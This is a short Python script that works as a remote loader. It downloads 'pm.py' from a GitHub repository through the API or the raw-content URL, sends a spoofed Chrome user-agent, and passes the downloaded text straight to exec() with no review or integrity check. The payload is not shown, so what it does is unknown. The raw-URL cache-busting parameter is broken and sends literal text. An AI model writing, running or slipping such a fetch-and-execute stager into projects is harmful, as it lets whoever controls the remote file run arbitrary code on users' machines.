import urllib.request
import json
import base64
import uuid
from types import SimpleNamespace

class Runtime:
  User_Agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

  @classmethod
  def run(cls,code):
    exec(code,globals())

  @classmethod
  def get(cls,url):
    headers = {
        'User-Agent': cls.User_Agent
    }
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req) as response:
        result = SimpleNamespace()
        result.status = response.status
        charset = response.info().get_content_charset() or 'utf-8'
        result.content = response.read().decode(charset)
        return result

class GitHub:
  api_access = "Unknown"

  @classmethod
  def getFileFromAPI(cls, path):
      path = path.split("|")
      url = f"https://api.github.com/repos/{path[0]}/{path[1]}/contents/{path[2]}?ref=main&cb={uuid.uuid4().hex}"
      req = urllib.request.Request(url)
      req.add_header('User-Agent', Runtime.User_Agent)
      try:
          try:
              response = urllib.request.urlopen(req)
              status_code = response.status
              raw_payload = response.read()
          except urllib.error.HTTPError as e:
              status_code = e.code
              raw_payload = e.read()
          result = SimpleNamespace()
          result.status = status_code
          if status_code == 200:
              data = json.loads(raw_payload.decode('utf-8'))
              content_b64 = data.get('content', '')
              result.content = base64.b64decode(content_b64).decode('utf-8')
              cls.api_access = "Allowed"
          else:
              result.content = raw_payload.decode('utf-8')
              cls.api_access = "Restricted"
          return result
      except Exception as e:
          cls.api_access = "Restricted"
          raise e

  @classmethod
  def getFileFromRAW(cls,path):
    path = path.split("|")
    return Runtime.get(f"https://raw.githubusercontent.com/{path[0]}/{path[1]}/refs/heads/main/{path[2]}?nocache=uuid.uuid4().hex")
    
  @classmethod
  def getFile(cls,path):
    try:
      result = cls.getFileFromAPI(path)
      print(result.status)
      return result
    except Exception as e:
      print(e)
      return cls.getFileFromRAW(path)

print("ver 0.94d")
Runtime.run(GitHub.getFile("db0bc|pm|pm.py").content)
